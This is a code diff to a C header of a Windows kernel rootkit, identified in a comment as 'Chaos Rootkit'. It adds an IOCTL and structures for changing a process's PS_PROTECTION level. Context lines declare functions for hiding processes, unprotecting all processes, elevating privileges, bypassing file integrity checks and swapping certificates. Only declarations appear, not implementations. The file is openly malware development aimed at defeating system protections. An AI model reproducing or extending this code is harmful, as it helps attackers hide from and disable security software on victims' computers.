@@ -27,8 +27,30 @@
 #define BYPASS_INTEGRITY_FILE_CTL               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x170, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define ZWSWAPCERT_CTL                          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x171, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+#define CR_SET_PROTECTION_LEVEL_CTL             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x172, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
 #define STATUS_ALREADY_EXISTS       ((NTSTATUS)0xB7)
 #define ERROR_UNSUPPORTED_OFFSET    ((NTSTATUS)0x00000233)
+
+typedef struct _PS_PROTECTION
+{
+    union
+    {
+        UCHAR Level;
+        struct
+        {
+            UCHAR Type : 3;
+            UCHAR Audit : 1;
+            UCHAR Signer : 4;
+        };
+    };
+} PS_PROTECTION, * PPS_PROTECTION;
+
+/* CR stands for Chaos Rootkit. */
+typedef struct _CR_SET_PROTECTION_LEVEL {
+    PS_PROTECTION Protection;
+    HANDLE Process;
+} CR_SET_PROTECTION_LEVEL, *PCR_SET_PROTECTION_LEVEL;
 
 typedef struct foperationx {
     int rpid;
@@ -91,7 +113,7 @@ DWORD       UnprotectAllProcesses();
 DWORD       HideProcess(int pid);
 DWORD       InitializeOffsets(Phooklist hooklist);
 DWORD       PrivilegeElevationForProcess(int pid);
-DWORD       ChangeProtectionLevel(int pid, BYTE protectionOption);
+NTSTATUS    ChangeProtectionLevel(PCR_SET_PROTECTION_LEVEL ProtectionLevel);
 NTSTATUS    InitializeStructure(Phooklist hooklist_s);
 const char* PsGetProcessImageFileName(PEPROCESS Process);
 
